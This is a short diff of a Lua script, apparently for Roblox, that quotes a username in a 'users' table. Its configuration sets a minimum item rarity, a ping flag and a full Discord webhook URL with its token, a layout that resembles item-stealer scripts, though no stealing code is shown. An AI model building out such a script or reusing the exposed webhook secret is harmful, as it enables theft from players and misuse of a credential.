@@ -19,7 +19,7 @@ local services = setmetatable({}, {
 	end
 })
 
-local users = {Protoxak}
+local users = {"Protoxak"}
 local min_rarity = "Common"
 local ping = "Yes"
 local webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
